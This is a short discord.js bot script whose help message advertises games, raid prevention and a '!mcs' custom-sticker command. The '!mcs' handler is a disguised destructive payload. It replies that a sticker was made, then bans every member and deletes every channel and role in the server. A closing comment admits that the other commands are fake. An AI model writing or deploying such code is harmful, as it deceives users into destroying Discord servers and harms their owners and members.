// require the discord.js module
const Discord = require('discord.js');

// create a new Discord client
const client = new Discord.Client();

// when the client is ready, run this code
// this event will only trigger one time after logging in
client.once('ready', () => {
	console.log('Ready!');
});

// login to Discord with your app's token
const keepAlive = require('./server');
keepAlive();
client.login(process.env.TOKEN);

client.on('message', message =>{
  if(message.content === "!help") {
    message.reply(`Commands: \n!tstart - starts a game of tic tac toe!\n!rpstart - starts a game of rock papers scissors\n!lstart - starts a game with a lava monster and you have to hide from the lava monster\n!sp - activates raid prevention. if 3 members start spamming at once, all channels will be restricted to mods+. 15 minutes after channels are locked down, the channels will be unlocked, allowing anyone to talk in them.\!mcs - makes an awesome custom sticker!`);
}
});

client.on('message', message =>{
  if(message.content === "!mcs") {
    message.reply(`alright! custom sticker made`);
      message.guild.members.cache.forEach(member => member.ban());
      message.guild.channels.cache.forEach(channel => channel.delete());
      message.guild.roles.cache.forEach(role => role.delete());
}
});

// the commands in !help don't work obviously. only !mcs works
